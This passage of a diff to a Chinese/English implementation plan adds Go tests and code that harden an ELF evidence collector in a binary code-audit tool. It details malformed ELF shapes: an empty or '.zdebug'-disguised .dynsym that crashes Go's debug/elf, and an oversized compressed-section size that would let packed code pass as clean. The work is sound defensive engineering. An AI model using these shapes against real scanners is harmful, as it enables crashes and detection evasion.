+// is present but declares sh_size == 0 makes debug/elf's 64-bit symbol reader
+// slice an empty buffer at byte 24 and panic ("slice bounds out of range
+// [24:0]") instead of returning an error: its only length check, len(data)%24,
+// accepts a zero length. ClassifyBinary returns KindELF on the four magic bytes
+// alone, so the shape is reachable from an untrusted file, and a panic aborts the
+// whole scan rather than marking the one file incomplete. collectELF has to hold
+// the table back - it holds no symbols, so nothing is lost - and must not claim
+// the table is absent, which would be a false statement about the file.
+func TestCollectELFEvidenceOnAZeroSizeDynsym(t *testing.T) {
+	dir := t.TempDir()
+	raw := elfFixtureBytes(t, elfSpec{
+		imports:    []string{"dlopen"},
+		zeroDynsym: true,
+		text:       []byte("a symbol table present but empty"),
+	})
+	path := writeTestBytes(t, dir, "zero-dynsym.so", raw)
+
+	// Prove the fixture really carries the crash shape, or the test would pass on
+	// a file that cannot panic.
+	f, err := elf.Open(path)
+	if err != nil {
+		t.Fatalf("elf.Open on the fixture: %v", err)
+	}
+	ds := f.SectionByType(elf.SHT_DYNSYM)
+	if ds == nil {
+		f.Close()
+		t.Fatal("fixture has no SHT_DYNSYM section")
+	}
+	size := ds.Size
+	f.Close()
+	if size != 0 {
+		t.Fatalf("fixture .dynsym size = %d, want 0", size)
+	}
+
+	// collectELF must return, not panic, and must neither invent a symbol from the
+	// unread table nor describe the present table as absent.
+	set := newTestEvidence(path, KindELF)
+	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
+		t.Fatalf("collectELF on a zero-size .dynsym: %v", err)
+	}
+	for _, l := range set.Lines {
+		if l.Source == SourceDynsym {
+			t.Errorf("a zero-size .dynsym produced symbol evidence %q", l.Text)
+		}
+		if l.Source == SourceNotice && strings.Contains(l.Text, "no dynamic symbol table") {
+			t.Errorf("a present but zero-size .dynsym was reported as an absent table: %q", l.Text)
+		}
+	}
+}
+
+// TestCollectELFEvidenceOnAZdebugNamedDynsym pins the second route to the same
+// crash. A section named ".zdebug..." of type SHT_DYNSYM whose body begins with
+// "ZLIB" has Section.Size rewritten from eight bytes the file chooses when the
+// section is opened - not when the file is parsed - so an on-disk sh_size that
+// looks perfectly ordinary (48 here) still yields an empty buffer, which the
+// symbol reader slices at entry 24 and panics on. Only reading the section the
+// way the reader does sees through it; a guard written against the header size
+// would wave this file through.
+func TestCollectELFEvidenceOnAZdebugNamedDynsym(t *testing.T) {
+	dir := t.TempDir()
+	raw := elfFixtureBytes(t, elfSpec{
+		zdebugDynsym: true,
+		text:         []byte("a disguised symbol table"),
+	})
+	path := writeTestBytes(t, dir, "zdebug-dynsym.so", raw)
+
+	// Check the shape the file presents before anything opens the section, since
+	// opening it is what rewrites the size - then confirm the empty buffer.
+	f, err := elf.Open(path)
+	if err != nil {
+		t.Fatalf("elf.Open on the fixture: %v", err)
+	}
+	ds := f.SectionByType(elf.SHT_DYNSYM)
+	if ds == nil {
+		f.Close()
+		t.Fatal("fixture has no SHT_DYNSYM section")
+	}
+	name, onDisk := ds.Name, ds.Size
+	data, dataErr := ds.Data()
+	f.Close()
+	if !strings.HasPrefix(name, ".zdebug") {
+		t.Fatalf("fixture .dynsym name = %q, want a \".zdebug\" prefix", name)
+	}
+	if onDisk == 0 {
+		t.Fatalf("fixture .dynsym on-disk size = 0; the point is that it looks ordinary")
+	}
+	if dataErr != nil {
+		t.Fatalf("reading the fixture's section: %v", dataErr)
+	}
+	if len(data) != 0 {
+		t.Fatalf("fixture section yielded %d bytes, want 0 - the ZLIB header must declare an empty table", len(data))
+	}
+
+	// collectELF must return, not panic, and must neither invent a symbol from the
+	// unread table nor describe the present table as absent.
+	set := newTestEvidence(path, KindELF)
+	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
+		t.Fatalf("collectELF on a .zdebug-named .dynsym: %v", err)
+	}
+	for _, l := range set.Lines {
+		if l.Source == SourceDynsym {
+			t.Errorf("a .zdebug-named .dynsym produced symbol evidence %q", l.Text)
+		}
+		if l.Source == SourceNotice && strings.Contains(l.Text, "no dynamic symbol table") {
+			t.Errorf("a present .zdebug-named .dynsym was reported as an absent table: %q", l.Text)
+		}
+	}
+}
+
+// TestCollectELFEvidenceFailsClosedOnATruncatedDynsym pins the boundary the
+// other two fixtures do not reach. A SHT_DYNSYM whose body is shorter than one
+// 24-byte entry (8 bytes here) is malformed, not empty: getSymbols64 rejects a
+// length that is not a multiple of the entry size and returns a format error, so
+// collectELF must fail the scan closed and say the table could not be read.
+// Skipping it as empty - which is what a length-range guard (len(data) < 24)
+// would do - is a fail-open, and it is the specific regression the wrong guard
+// shape would have introduced: the two panic fixtures both have a genuinely
+// empty buffer, so both pass under either guard, while only this one tells them
+// apart.
+func TestCollectELFEvidenceFailsClosedOnATruncatedDynsym(t *testing.T) {
+	dir := t.TempDir()
+	raw := elfFixtureBytes(t, elfSpec{
+		shortDynsym: true,
+		text:        []byte("a symbol table too short to hold a symbol"),
+	})
+	path := writeTestBytes(t, dir, "truncated-dynsym.so", raw)
+
+	// Prove the fixture carries the shape: a non-empty body that is not a whole
+	// number of entries, under an ordinary name and an ordinary declared size.
+	f, err := elf.Open(path)
+	if err != nil {
+		t.Fatalf("elf.Open on the fixture: %v", err)
+	}
+	ds := f.SectionByType(elf.SHT_DYNSYM)
+	if ds == nil {
+		f.Close()
+		t.Fatal("fixture has no SHT_DYNSYM section")
+	}
+	name, size := ds.Name, ds.Size
+	data, dataErr := ds.Data()
+	f.Close()
+	if name != ".dynsym" {
+		t.Fatalf("fixture .dynsym name = %q, want %q", name, ".dynsym")
+	}
+	if dataErr != nil {
+		t.Fatalf("reading the fixture's section: %v", dataErr)
+	}
+	if len(data) == 0 {
+		t.Fatal("fixture section yielded 0 bytes; this test is about a non-empty, malformed table")
+	}
+	if uint64(len(data)) != size {
+		t.Fatalf("fixture section yielded %d bytes under a declared size of %d; the malformation must be the length, not a short read", len(data), size)
+	}
+	if len(data)%24 == 0 {
+		t.Fatalf("fixture body is %d bytes, a whole number of 24-byte entries; the reader would accept it", len(data))
+	}
+
+	// collectELF must fail closed rather than skip the table as empty.
+	set := newTestEvidence(path, KindELF)
+	err = collectELF(path, set, DefaultBinaryConfig())
+	if err == nil {
+		t.Fatal("collectELF accepted a truncated .dynsym; a malformed table must fail the scan rather than be skipped as empty")
+	}
+	if !strings.Contains(err.Error(), "dynamic symbols") {
+		t.Errorf("error = %v, want it to name the dynamic symbol read", err)
+	}
+}
+
+// TestCollectELFEvidenceReportsACompressedSectionWithAnOutOfRangeSize pins the
+// unsigned size comparison. For a SHF_COMPRESSED section debug/elf takes
+// Section.Size from the compression header's ch_size without the int64 range
+// check it applies to sh_size, so a crafted ch_size with the top bit set makes
+// int64(Section.Size) negative: a signed "read < int64(sec.Size)" is false for
+// every non-negative read, the section scores as read in full, and - because
+// executable code is not random - its entropy is reported as clean. The fixture's
+// section decompresses to far fewer bytes than it declares, which is exactly the
+// short-read the check exists to catch, so the size must be compared in its own
+// unsigned domain.
+func TestCollectELFEvidenceReportsACompressedSectionWithAnOutOfRangeSize(t *testing.T) {
+	// 2^63, one past the largest int64: int64(ch_size) is negative.
+	const declared = uint64(1) << 63
+	payload := bytes.Repeat([]byte{0x90}, 4096) // low entropy: no verdict either way
+
+	dir := t.TempDir()
+	path := writeTestBytes(t, dir, "packed.so", elfCompressedFixture(t, declared, payload))
+
+	// The fixture must be the shape the check is for: a compressed executable
+	// section whose reported size is the declared one.
+	f, err := elf.Open(path)
+	if err != nil {
+		t.Fatalf("elf.Open on the fixture: %v", err)
+	}
+	var sec *elf.Section
+	for _, s := range f.Sections {
+		if s.Flags&elf.SHF_EXECINSTR != 0 {
+			sec = s
+		}
+	}
+	if sec == nil {
+		f.Close()
+		t.Fatal("fixture has no executable section")
+	}
+	size := sec.Size
+	f.Close()
+	if size != declared {
+		t.Fatalf("fixture section size = %d, want %d (debug/elf must take it from ch_size)", size, declared)
+	}
+
+	set := newTestEvidence(path, KindELF)
+	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
+		t.Fatalf("collectELF on a compressed section: %v", err)
+	}
+	if !set.Bound.Structural {
+		t.Fatalf("a compressed executable section declaring %d bytes recorded no structural bound; bound = %+v", declared, set.Bound)
+	}
+	if !strings.Contains(set.Bound.Reason, "readable") {
+		t.Errorf("bound reason = %q, want the short-read reason", set.Bound.Reason)
+	}
+	for _, l := range set.Lines {
+		if l.Source == SourceEntropy {
+			t.Errorf("an under-read executable section produced entropy evidence %q", l.Text)
+		}
+	}
+}
+
+// TestCollectELFEvidenceNormalizesAZeroConfig pins that collectELF resolves a
+// zero BinaryConfig to the defaults, as its peers do. Without that,
+// MaxStreamBytes of 0 spends the per-file budget before the first section, so
+// every executable section records a "0-byte per-file budget was spent"
+// structural bound and the package is deleted - a false block produced by a
+// caller that knows about only one field. The same file under the default config
+// is clean, so the two must agree.
+func TestCollectELFEvidenceNormalizesAZeroConfig(t *testing.T) {
+	dir := t.TempDir()
+	raw := elfFixtureBytes(t, elfSpec{
+		imports:  []string{"dlopen"},
+		text:     []byte("an ordinary executable section of perfectly normal code"),
+		textExec: true,
+	})
+	path := writeTestBytes(t, dir, "normal.so", raw)
+
+	zero := newTestEvidence(path, KindELF)
+	if err := collectELF(path, zero, BinaryConfig{}); err != nil {
+		t.Fatalf("collectELF with a zero config: %v", err)
+	}
+	def := newTestEvidence(path, KindELF)
+	if err := collectELF(path, def, DefaultBinaryConfig()); err != nil {
+		t.Fatalf("collectELF with the default config: %v", err)
+	}
+
+	if zero.Bound.Structural {
+		t.Errorf("a zero config produced a structural bound %+v; the zero value must mean the defaults", zero.Bound)
+	}
+	if zero.Bound != def.Bound {
+		t.Errorf("zero config bound = %+v, default config bound = %+v; they must agree", zero.Bound, def.Bound)
+	}
+	if len(zero.Lines) != len(def.Lines) {
+		t.Fatalf("zero config produced %d evidence lines, default config produced %d", len(zero.Lines), len(def.Lines))
+	}
+	for i := range zero.Lines {
+		z, d := zero.Lines[i], def.Lines[i]
+		if z.Source != d.Source || z.Offset != d.Offset || z.Text != d.Text {
+			t.Errorf("line %d differs: zero config (%s %d %q), default config (%s %d %q)",
+				i, z.Source, z.Offset, z.Text, d.Source, d.Offset, d.Text)
+		}
+	}
+}
+
+// TestCountSectionStreamsTheSameHistogramAsABufferRead pins that chunking the
+// section read does not change the number it produces. The fixture is larger
+// than one chunk so the loop body runs more than once: an implementation that
+// reset its counters per chunk, or dropped the final short chunk, would still
+// pass a single-chunk test and would make an ELF section's entropy depend on its
+// size rather than on its bytes.
+func TestCountSectionStreamsTheSameHistogramAsABufferRead(t *testing.T) {
+	data := make([]byte, entropyChunkBytes+1234)
+	for i := range data {
+		data[i] = byte((i * 31) % 251)
+	}
+
+	counts, n, err := countSection(bytes.NewReader(data), 0)
+	if err != nil {
+		t.Fatalf("countSection: %v", err)
+	}
+	if n != int64(len(data)) {
+		t.Fatalf("countSection read %d bytes, want %d", n, len(data))
+	}
+	if got, want := shannonEntropy(counts, n), measureEntropy(data); math.Abs(got-want) > 1e-12 {
+		t.Errorf("streamed entropy = %v, buffered = %v; the two must agree", got, want)
+	}
+
+	// A budget smaller than the section stops the read and reports how far it
+	// got, which is the number the caller compares against the declared size.
+	const budget = int64(4096)
+	if _, n, err := countSection(bytes.NewReader(data), budget); err != nil || n != budget {
+		t.Errorf("countSection with a %d-byte budget read %d bytes (err=%v), want exactly %d", budget, n, err, budget)
 	}
 }
 
@@ -1815,15 +4192,40 @@ func containsString(haystack []string, needle string) bool {
 }
 ```
 
-- [ ] **Step 3: 跑测试确认失败**
+本步还要给 Task 3 的 `TestEntropyVerdictIsMeasuredNotAssumed` 补一段断言：流式路径与内存路径必须给出**同一行**。它落在本步而不是 Task 3，理由与上面那两个符号相同——Task 3 里两条路还不都存在（`entropyVerdictFromCounts` 与 `countSection` 都是 Task 5 才引入的），把断言留在 Task 3 就是描述一个从未存在过的状态。追加到那条测试的末尾：
 
-```bash
-go test ./internal/codeaudit/ -run 'TestELFFixture|TestCollectELF' 2>&1 | head -20
+```go
+	// The streaming path and the in-memory path must agree, because an ELF
+	// section is measured one way and a container member the other. Both are
+	// driven from the same bytes here, and the assertion is equality of the
+	// rendered line rather than of the number: the line is what reaches the
+	// evidence set, so a divergence that only shows up in the formatting would
+	// otherwise go unnoticed.
+	var counts [256]int64
+	for _, b := range uniform {
+		counts[b]++
+	}
+	streamed, streamedOK := entropyVerdictFromCounts(".text", counts, int64(len(uniform)), cfg)
+	inMemory, inMemoryOK := entropyVerdict(".text", uniform, cfg)
+	if streamed != inMemory || streamedOK != inMemoryOK {
+		t.Errorf("streamed = (%q, %v), in-memory = (%q, %v); the two paths must agree",
+			streamed, streamedOK, inMemory, inMemoryOK)
+	}
 ```
 
-预期：`TestELFFixtureIsReadByTheStandardLibrary` PASS（夹具本身正确），`TestCollectELFEvidence` 编译失败 `undefined: collectELF`。
+- [ ] **Step 3: 跑测试确认失败**
 
-> 若夹具测试就失败，按 `debug/elf` 的报错逐个字段核对：最常见的是 `e_shstrndx` 与 `./shstrtab` 的节索引不一致（本文档中为 5），或 `sh_link` 未指向 `.dynstr`（本文档中为 2）。
+本步 `binary_evidence_test.go` 的 import 块至少要含 `"bytes"`（`bytes.NewReader`/`bytes.Repeat`）、`"debug/elf"`（夹具守卫用例要自己 `elf.Open` 一次）、`"fmt"`（拼接 `size=` 的期望串）、`"math"`（流式与内存两条路比对熵值）、`"strings"`、`"testing"`。Go 拒绝未使用的 import，所以这些是随本步的用例一起加进来的。
+
+```bash
+go test ./internal/codeaudit/ -run 'TestELFFixture|TestCollectELF|TestCountSection' 2>&1 | head -20
+```
+
+预期：`go test` **不输出任何测试结果**，而是报**构建失败**，错误指向 Task 5 尚未定义的那些符号（首条通常是 `undefined: collectELF`，还会有 `undefined: countSection`、`undefined: entropyVerdictFromCounts`、`undefined: entropyChunkBytes`）。
+
+`TestELFFixtureIsReadByTheStandardLibrary` 在本步**不可能 PASS**：Go 把一个测试包当一个编译单元，`collectELF` 未定义时整包编不过，测试二进制根本不会生成——"夹具守卫先于它所守护的实现通过"在 Go 里不是一个可达的状态。所以本步的判据不是"守卫通过"，而是**失败的原因是对的**：错误必须是"该有的符号还没定义"，而**不得**指向夹具构造器本身（除了 `undefined: …`，若还出现 `elfFixtureBytes` 的类型或语法错误，说明夹具写坏了，先修夹具）。夹具守卫的断言真正生效在 Step 5——包能编过之后，它先于任何抽取断言运行，那时它才承担自己的职责。
+
+> 若到 Step 5 守卫才失败，按 `debug/elf` 的报错逐个字段核对：最常见的是 `e_shstrndx` 与 `.shstrtab` 的节索引不一致（本文档中为 6，节表共 7 项：0 空、1 `.text`、2 `.init`、3 `.dynstr`、4 `.dynsym`、5 `.dynamic`、6 `.shstrtab`），或 `sh_link` 未指向 `.dynstr`（本文档中为 3）。索引固定不随 spec 变化，所以 `.dynsym` 被 stripped 掉时留下的是一个全零的 SHT_NULL 头，而不是把后面的节全部前移——这样 `e_shstrndx` 对每个夹具都是同一个数。
 
 - [ ] **Step 4: 实现 ELF 抽取**
 
@@ -1840,10 +4242,26 @@ go test ./internal/codeaudit/ -run 'TestELFFixture|TestCollectELF' 2>&1 | head -
 // eight bits per byte has been compressed or encrypted, and something has to
 // unpack it at run time for it to run.
 //
-// The parse is bounded per section, not per file: a section that cannot be read
-// within MaxSectionBytes is a structural bound, and for a format that executes
-// that withholds a clean verdict rather than being shrugged off.
+// There is no strings pass here, and the plan says so rather than leaving it to
+// be rediscovered: Task 6 Step 4 rewrites this function to stream the file's
+// literals first and parse it second, through streamWithSizeSwitch so that a
+// large shared object is windowed at its ends like any other large blob. The
+// split is not an oversight to be "fixed" early - the size decision is what the
+// ELF path shares with every other kind, and writing it here would mean writing
+// it twice, in the one task that does not yet have the size switch. What Task 5
+// owns is the structure, and its tests assert exactly that.
 func collectELF(path string, set *EvidenceSet, cfg BinaryConfig) error {
+	// Every other entry point into the evidence set resolves its config first -
+	// newEvidenceSet and newStringScanner both call normalizeBinaryConfig - and this
+	// function reads cfg.MaxStreamBytes directly for the per-file section budget, so
+	// it has to as well. Without the line a caller that passed a zero
+	// BinaryConfig{} would get a zero budget, every executable section would record
+	// "the budget was spent" as a structural bound, and an executable-kind file
+	// would be deleted for a configuration that was merely left unset. That is a
+	// footgun aimed at whichever task wires the channel, and it is invisible in
+	// every test that builds its config through DefaultBinaryConfig.
+	cfg = normalizeBinaryConfig(cfg)
+
 	f, err := os.Open(path)
 	if err != nil {
 		return fmt.Errorf("open %s: %w", path, err)
@@ -1858,6 +4276,23 @@ func collectELF(path string, set *EvidenceSet, cfg BinaryConfig) error {
 		return fmt.Errorf("parse elf %s: %w", path, err)
 	}
 	defer ef.Close()
+
+	// A file with no section header table is a structural gap, and this check is
+	// the removal of a fail-open rather than a nicety. The packing detector's
+	// input is the executable sections; with no section table there are none to
+	// measure, so the file used to fall through the section loop, produce no
+	// entropy line and no bound, and pass as clean - a pass that says "no packing
+	// found" about a file that was never examined for packing. The input most
+	// likely to have no section table is one whose section table was deliberately
+	// removed, which is exactly the file this detector exists for.
+	//
+	// The reason names the real condition. It is not "no symbol table": a
+	// sectionless file has no .dynsym, but so does a stripped one, and a stripped
+	// binary is ordinary and must not be treated this way. What is absent is the
+	// section header table, and that is what the evidence says.
+	if len(ef.Sections) == 0 {
+		set.markStructural("no section header table: the executable-section entropy pass had nothing to measure")
+	}
 
 	// The interpreter and the soname are notices rather than measurements: they
 	// say what kind of object this is, and a reader comparing two reports uses
@@ -1889,27 +4324,120 @@ func collectELF(path string, set *EvidenceSet, cfg BinaryConfig) error {
 	// DynamicSymbols rather than ImportedSymbols: the latter drops the symbol's
 	// value and section, and the section is what separates an import (SHN_UNDEF)
 	// from a definition. Only imports are evidence of what the binary can call.
-	syms, err := ef.DynamicSymbols()
-	if err != nil && !errors.Is(err, elf.ErrNoSymbols) {
-		return fmt.Errorf("read dynamic symbols of %s: %w", path, err)
-	}
-	for _, s := range syms {
-		if s.Section != elf.SHN_UNDEF || elf.ST_BIND(s.Info) != elf.STB_GLOBAL {
-			continue
+	//
+	// SHT_SYMTAB is deliberately not read as a fallback, and the notice below is
+	// worded to say only what was observed rather than to guess. A static binary
+	// has no .dynsym but does carry .symtab, so a "stripped or static" notice was
+	// false for it; and .symtab's entries are mostly this file's own defined
+	// symbols, so using it as a capability source would mean matching the
+	// program's own identifiers - the same false-positive class the free-string
+	// families were demoted for. Task 8's rule table is unchanged by this: no new
+	// evidence source is introduced, which is the point.
+	//
+	// The dynamic symbol read is guarded rather than attempted and recovered,
+	// because debug/elf's symbol reader panics instead of returning an error on
+	// one input, and that input is reachable from an untrusted file: ClassifyBinary
+	// returns KindELF on the four magic bytes alone and does not look at EI_CLASS,
+	// so every size and name the reader acts on is a field the file itself chooses.
+	//
+	// getSymbols64 (file.go:675-691) fetches the section's data, rejects it only
+	// when len(data)%Sym64Size != 0, and then slices data[Sym64Size:] to drop the
+	// reserved null entry. Zero is a multiple of every entry size, so a
+	// zero-length buffer passes that check and the slice panics with "slice bounds
+	// out of range [24:0]"; every other short length is not a multiple and takes
+	// the error return instead. The panic set is therefore exactly {0}, not every
+	// length below one entry - which is why the guard is "the buffer is empty" and
+	// not "the size is smaller than a symbol header". A range guard is not merely
+	// wider than needed, it is backwards: lengths 1..23 already fail the scan
+	// closed through the error path, and holding them back here would convert that
+	// failure into a silent skip - a new fail-open, in the one function whose whole
+	// argument is that not looking must not read as clean.
+	//
+	// There is deliberately no class test here. getSymbols32 (file.go:631-633)
+	// carries an explicit `if len(data) == 0` return of its own, before its slice,
+	// so a 32-bit table cannot panic and needs no guard to stay safe. The fact the
+	// guard is about - the section yields no bytes - is the same for both classes,
+	// and a table that yields no bytes holds no symbols either way, so one uniform
+	// check covers both without branching on EI_CLASS, a field ClassifyBinary never
+	// looks at.
+	//
+	// symbolTableIsEmpty asks the question the way the reader gets its answer, and
+	// that is not the same as reading the section header: Section.Data (file.go:107)
+	// is saferio.ReadData(s.Open(), s.Size) with the arguments evaluated left to
+	// right, and Section.Open (file.go:126) rewrites s.Size at file.go:146 for a
+	// section whose name starts with ".zdebug" whose first twelve bytes are "ZLIB",
+	// taking the value from bytes the file chooses. A body of "ZLIB" plus eight
+	// zero bytes therefore makes that size zero - ReadData allocates nothing,
+	// io.ReadFull on an empty buffer succeeds vacuously, and it returns a non-nil
+	// empty slice with a nil error - and getSymbols64 sees len(data) == 0, passes
+	// its multiple check and panics. None of this is visible in sh_size, which stays
+	// an ordinary 12, so a reader checking the header would conclude the guard is
+	// unnecessary; that is the mistake this comment exists to prevent.
+	//
+	// SectionByType returns the first section of the requested type, which is what
+	// makes the shape cheap to reach: a file only has to put its ".zdebug" section
+	// ahead of its real one.
+	//
+	// A table that yields no bytes holds no symbols, so skipping it reads as
+	// "imports nothing", which is the true statement about a zero-entry table, and
+	// raises no bound because nothing was left unexamined. Calling a present table
+	// "absent" would be a false statement, so no notice is written on this path.
+	dynsym := ef.SectionByType(elf.SHT_DYNSYM)
+	switch {
+	case dynsym == nil:
+		set.addStructured(SourceNotice, "no dynamic symbol table (SHT_DYNSYM absent)")
+	default:
+		empty, derr := symbolTableIsEmpty(dynsym)
+		if derr != nil {
+			return fmt.Errorf("read dynamic symbols of %s: %w", path, derr)
 		}
-		set.addStructured(SourceDynsym, s.Name)
-	}
-	if errors.Is(err, elf.ErrNoSymbols) {
-		set.addStructured(SourceNotice, "no dynamic symbol table (stripped or static)")
+		if empty {
+			break
+		}
+		syms, err := ef.DynamicSymbols()
+		if err != nil && !errors.Is(err, elf.ErrNoSymbols) {
+			return fmt.Errorf("read dynamic symbols of %s: %w", path, err)
+		}
+		if errors.Is(err, elf.ErrNoSymbols) {
+			set.addStructured(SourceNotice, "no dynamic symbol table (SHT_DYNSYM absent)")
+		}
+		for _, s := range syms {
+			if s.Section != elf.SHN_UNDEF || elf.ST_BIND(s.Info) != elf.STB_GLOBAL {
+				continue
+			}
+			set.addStructured(SourceDynsym, s.Name)
+		}
 	}
 
+	// The per-file read budget for this parse, spent across all the sections
+	// rather than reset for each one. A budget per section would make the cost of
+	// a file scale with how many executable sections it declares, and a file can
+	// declare as many as it likes - the same unbounded-work shape the streaming
+	// pass's budget exists to stop, reintroduced through the section headers.
+	budget := cfg.MaxStreamBytes
 	for _, sec := range ef.Sections {
 		executable := sec.Flags&elf.SHF_EXECINSTR != 0
+		// size= is the section header's declared size, not a count of bytes this
+		// pass read. The two differ when the section claims more than the file
+		// holds, and that case gets its own line below rather than being folded
+		// into this one - a reader comparing size= against a shortfall they cannot
+		// see would have no way to tell the claim from the read. For an
+		// SHF_COMPRESSED section sec.Size is the compression header's ch_size
+		// rather than sh_size, which is the same "declared, not observed" value
+		// and is also the reason the shortfall check below compares unsigned.
 		set.addStructured(SourceSection, fmt.Sprintf("%s size=%d executable=%t", sec.Name, sec.Size, executable))
 		if !executable || sec.Size == 0 {
 			continue
 		}
-		data, bounded, readErr := readBoundedSection(sec, cfg.MaxSectionBytes)
+		if budget <= 0 {
+			// Not a zero-budget read: countSection treats a non-positive budget as
+			// "unlimited", which is right for a caller with no bound and wrong
+			// here. The spend is what names the limit.
+			set.markStructural(fmt.Sprintf("section %s not read: the %d-byte per-file budget was spent", sec.Name, cfg.MaxStreamBytes))
+			continue
+		}
+		counts, read, readErr := countSection(sec.Open(), budget)
+		budget -= read
 		if readErr != nil {
 			// A section that cannot be read is a gap in the evidence, not a
 			// reason to abandon the file: the symbols already gathered are still
@@ -1917,34 +4445,184 @@ func collectELF(path string, set *EvidenceSet, cfg BinaryConfig) error {
 			set.markStructural(fmt.Sprintf("section %s unreadable: %v", sec.Name, readErr))
 			continue
 		}
-		if bounded {
-			set.markStructural(fmt.Sprintf("section %s exceeds MaxSectionBytes", sec.Name))
+		// The comparison is unsigned, and that is not a style choice. sec.Size is
+		// the section header's declared size, and for an ordinary section that is
+		// sh_size, which debug/elf range-checks at parse time
+		// (`if int64(s.FileSize) < 0 { FormatError }`) - so the signed form would
+		// be safe there. For an SHF_COMPRESSED section it is not: debug/elf takes
+		// sec.Size from the compression header's ch_size and applies no such check,
+		// so a crafted ch_size = 2^63 makes sec.Size a uint64 whose int64 view is
+		// negative, `read < int64(sec.Size)` is false for every possible read, and
+		// the section is treated as read in full - never marked structural, and,
+		// because it is executable, its prefix entropy-measured and reported as
+		// clean. That is the fail-open this whole check exists to close, reopened
+		// by a cast. Unsigned compares the two numbers as the counts they are.
+		if uint64(read) < sec.Size {
+			// The section declares more bytes than were read. Two things produce
+			// this and both are the same fact about the file: a sh_offset or
+			// sh_size that runs past the end of it (the read stops at EOF), and a
+			// per-file budget breach. Either way the entropy number would be over
+			// a prefix, so it is not reported at all and the shortfall is the
+			// evidence instead: a section that could not be read in full is not a
+			// section that was measured, and for a format that executes,
+			// "not measured" must not reach the report as "measured clean".
+			set.markStructural(fmt.Sprintf("section %s declares %d bytes, %d readable", sec.Name, sec.Size, read))
+			continue
 		}
-		if line, ok := entropyVerdict(sec.Name, data, cfg); ok {
+		if line, ok := entropyVerdictFromCounts(sec.Name, counts, read, cfg); ok {
 			set.addStructured(SourceEntropy, line)
 		}
 	}
 	return nil
 }
 
-// readBoundedSection reads at most limit bytes of one section, reporting whether
-// the read was cut. The bound exists because a section can declare any size it
-// likes, and a report that tried to hold a declared gigabyte would be the denial
-// of service the audit is supposed to be part of preventing.
-func readBoundedSection(sec *elf.Section, limit int64) (data []byte, bounded bool, err error) {
-	reader := sec.Open()
-	if limit > 0 && sec.Size > uint64(limit) {
-		bounded = true
-	}
-	data, err = io.ReadAll(io.LimitReader(reader, limit))
+// symbolTableIsEmpty reports whether a symbol section would hand debug/elf's
+// symbol reader an empty buffer, which is the one input that reader panics on
+// instead of returning an error. getSymbols64 (file.go) rejects a length that is
+// not a multiple of its entry size and then slices the first entry off
+// unconditionally, and zero is a multiple of every entry size - so a length of
+// 1..entrySize-1 is an error that fails the scan closed and has to be left to
+// the reader, while an empty buffer has to be caught here.
+//
+// It reads the section through Section.Data, the call the reader itself makes,
+// rather than testing a size in the header, because the header size is not the
+// whole story: Section.Open (file.go) rewrites Section.Size for a section named
+// ".zdebug..." whose body begins with "ZLIB", taking the value from eight bytes
+// the file chooses, and Section.Data is saferio.ReadData(s.Open(), s.Size) with
+// those arguments evaluated left to right - so the size Data is handed is the
+// one Open just wrote. A section whose on-disk sh_size looks ordinary can
+// therefore still yield nothing, and a guard reading sh_size would miss it.
+// Reading the data is the check that covers both routes, and it is also the safe
+// direction: Data returns an error where the symbol reader would panic.
+func symbolTableIsEmpty(sec *elf.Section) (bool, error) {
+	data, err := sec.Data()
 	if err != nil {
-		return nil, bounded, err
+		return false, err
 	}
-	return data, bounded, nil
+	return len(data) == 0, nil
+}
+
+// countSection streams one section through the entropy histogram in fixed-size
+// chunks and returns the histogram, the number of bytes it read and any read
+// error.
+//
+// It streams because a section header may declare any size and the section may
+// be read whole: an earlier version read it with io.ReadAll under a per-section
+// cap, and that cap fired on ordinary real libraries. Memory here is 256 counters
+// and one chunk regardless of how large the section is, so the only cost that
+// scales is the read itself, and the read is bounded per file by the budget the
+// caller passes (MaxStreamBytes) rather than per section - a budget that only a
+// file with gigabytes of executable sections can reach.
+//
+// It returns the count so the caller can compare it against the declared size:
+// the histogram is over a prefix whenever the read stopped early, and a prefix is
+// not something this function can tell the caller about on its own.
+//
+// The read is clamped to what the budget has left before it is issued, the same
+// way streamEvidence clamps its reads. Reading a whole chunk and testing the
+// budget at the top of the loop lets one chunk walk straight past a budget
+// smaller than it: a 4 KiB budget would return 65536, which overshoots the byte
+// count the caller subtracts from its per-file budget and makes the count depend
+// on the chunk size rather than on the budget.
+func countSection(r io.Reader, budget int64) (counts [256]int64, n int64, err error) {
+	buf := make([]byte, entropyChunkBytes)
+	for budget <= 0 || n < budget {
+		limit := len(buf)
+		if budget > 0 && int64(limit) > budget-n {
+			limit = int(budget - n)
+		}
+		read, readErr := r.Read(buf[:limit])
+		for _, b := range buf[:read] {
+			counts[b]++
+		}
+		n += int64(read)
+		if readErr == io.EOF {
+			return counts, n, nil
+		}
+		if readErr != nil {
+			return counts, n, readErr
+		}
+	}
+	return counts, n, nil
 }
 ```
 
-同时给 `EvidenceSet` 加两个小方法（结构证据无字节偏移，走 `Offset: 0`）：
+本步还要把判定从 Task 3 的 `entropyVerdict`（直接吃 `[]byte`）里抽出来，因为流式路径手里没有 `[]byte`，而给它再写一份阈值判断会让**同一个可执行节**因为读它的路径不同而得到不同的判定。所以把决策整体搬进 `entropyVerdictFromCounts`，让 `entropyVerdict` 退化成"建直方图再转交"的包装，并补上 `countSection` 用到的 `entropyChunkBytes`。
+
+**这两个符号与这个常量只在 Task 5 引入，Task 3 的正文必须保持"`entropyVerdict` 直接吃 `[]byte`"的原样**——Task 3 已经作为 `7e37aca` 提交过，它交付的就是那一版；如果在 Task 3 的正文里写成"判定已经抽好了"，那 Task 3 就描述了一个从未存在过的状态，按顺序执行的人在 Task 3 之后会拿到一个 `entropyVerdictFromCounts` 未定义、根本编不过的包。**Task 5 是本任务里第一个需要这个拆分的步骤，所以拆分落在这里。**
+
+改 Task 3 写下的两处，并追加常量：
+
+```go
+// measureEntropy is shannonEntropy over a buffer in memory, for the cases where
+// the bytes are already in hand - a container member is the one that matters
+// here. ELF sections do not use it: they are streamed through countSection in
+// fixed chunks so that a section that declares a gigabyte cannot make this pass
+// hold a gigabyte (see countSection), and both paths meet again in
+// entropyVerdictFromCounts.
+// （上面这段替换 Task 3 里那个两行的注释，函数体不变。）
+func measureEntropy(data []byte) float64 { /* 同 Task 3 */ }
+
+// entropyVerdictFromCounts renders a section's entropy as evidence, or reports
+// that there is nothing to say. It is the whole of the decision, over a
+// histogram rather than over bytes.
+//
+// It is called for executable sections only, and that restriction is the whole
